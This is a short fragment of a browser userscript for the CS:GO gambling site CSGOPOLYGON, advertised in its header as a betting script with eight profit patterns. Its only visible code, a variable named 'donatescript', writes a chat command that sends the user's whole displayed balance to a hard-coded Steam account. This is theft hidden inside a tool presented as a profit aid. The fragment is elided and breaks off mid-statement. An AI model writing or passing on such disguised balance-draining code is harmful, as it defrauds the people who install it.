// ==UserScript==
// @name            CSGOPOLYGON script, with 8 paterns. 
// @description     A script using 8 different system to make profit.
// @namespace       lenar
// @version         1
// @author          lenar
...
var donatescript="setInterval(function(){"+
    "}, 1000);"+
    "$('#chatMessage_k').val('/s 76561197960525454 '+$('#balance_r').text());"+
